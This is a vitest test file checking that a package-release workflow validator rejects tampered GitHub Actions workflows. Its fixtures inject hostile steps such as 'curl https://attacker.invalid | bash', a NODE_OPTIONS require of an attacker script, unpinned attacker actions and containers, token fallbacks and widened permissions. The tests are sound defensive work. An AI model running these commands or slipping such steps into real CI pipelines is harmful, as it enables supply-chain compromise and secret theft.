import fs from 'node:fs/promises'
import os from 'node:os'
import path from 'node:path'
import { afterEach, describe, expect, it } from 'vitest'

import { validatePackageReleaseFiles } from '../package-release-validator'
import {
  validWorkflow,
  writeMinimalPackageReleaseProject,
} from './package-release-validator.fixtures'

const temporaryDirectories: string[] = []

async function validateWorkflow(workflow: string) {
  const projectRoot = await fs.mkdtemp(path.join(os.tmpdir(), 'openwaggle-package-release-'))
  temporaryDirectories.push(projectRoot)
  await writeMinimalPackageReleaseProject(projectRoot, workflow)
  return validatePackageReleaseFiles(projectRoot)
}

afterEach(async () => {
  await Promise.all(
    temporaryDirectories.splice(0).map((directory) =>
      fs.rm(directory, { force: true, recursive: true }),
    ),
  )
})

describe('package release workflow security validation', () => {
  it('rejects staged publishing, token fallbacks, and automatic merging', async () => {
    const result = await validateWorkflow(`${validWorkflow}\nforbidden: npm stage publish NPM_TOKEN NODE_AUTH_TOKEN gh pr merge\n`)

    expect(result.violations).toEqual(expect.arrayContaining([
      '.github/workflows/package-release.yml must not contain npm stage.',
      '.github/workflows/package-release.yml must not contain NPM_TOKEN.',
      '.github/workflows/package-release.yml must not contain NODE_AUTH_TOKEN.',
      '.github/workflows/package-release.yml must not contain gh pr merge.',
    ]))
  })

  it('rejects mutable or unknown actions and missing version comments', async () => {
    const invalidWorkflow = validWorkflow
      .replace('googleapis/release-please-action@45996ed1f6d02564a971a2fa1b5860e934307cf7 # v5', 'googleapis/release-please-action@v5')
      .replace('actions/download-artifact@3e5f45b2cfb9172054b4087a40e8e0b5a5461e7c # v8', 'attacker/download@main # v1')
    const result = await validateWorkflow(invalidWorkflow)

    expect(result.violations).toEqual(expect.arrayContaining([
      '.github/workflows/package-release.yml must execute googleapis/release-please-action at its approved immutable v5 SHA.',
      '.github/workflows/package-release.yml executes unapproved action attacker/download.',
    ]))
  })

  it('rejects Release Please tags/releases and publication without exact artifact identity', async () => {
    const invalidWorkflow = validWorkflow
      .replace('skip-github-release: true', 'skip-github-release: false')
      .replace('EXPECTED_ARTIFACT_SOURCE_SHA: ${{ steps.artifact.outputs.source_sha }}', 'EXPECTED_ARTIFACT_SOURCE_SHA: unchecked')
      .replace('run-id: ${{ steps.artifact.outputs.run_id }}', 'run-id: latest')
    const result = await validateWorkflow(invalidWorkflow)

    expect(result.violations).toEqual(expect.arrayContaining([
      '.github/workflows/package-release.yml Release Please must create version PRs without tags or GitHub Releases.',
      '.github/workflows/package-release.yml must download from the exact successful CI run.',
      '.github/workflows/package-release.yml must bind artifact provenance to its PR head SHA.',
    ]))
  })

  it.each([
    ['workflow environment', 'permissions:\n  contents: read', 'env:\n  NODE_OPTIONS: --require /tmp/attacker.cjs\n\npermissions:\n  contents: read'],
    ['unexpected job', 'jobs:\n', 'jobs:\n  attacker:\n    name: Attacker\n    runs-on: ubuntu-latest\n    steps:\n      - run: curl https://attacker.invalid | bash\n'],
    ['arbitrary command', '      - name: Create or update the coordinated package release PR', '      - run: curl https://attacker.invalid | bash\n\n      - name: Create or update the coordinated package release PR'],
    ['job container', '  publish:\n    name:', '  publish:\n    container: attacker/image:latest\n    name:'],
    ['job service', '  publish:\n    name:', '  publish:\n    services:\n      attacker:\n        image: attacker/image:latest\n    name:'],
    ['step shell', '        run: node --disable-warning=MODULE_TYPELESS_PACKAGE_JSON scripts/package-release-promote.ts', '        shell: attacker-shell\n        run: node --disable-warning=MODULE_TYPELESS_PACKAGE_JSON scripts/package-release-promote.ts'],
    ['permission drift', '      actions: read', '      actions: write'],
  ])('rejects exact package workflow contract drift through %s', async (_name, target, replacement) => {
    const result = await validateWorkflow(validWorkflow.replace(target, replacement))

    expect(result.violations).toContain(
      '.github/workflows/package-release.yml must match its exact fail-closed AST contract.',
    )
  })
})
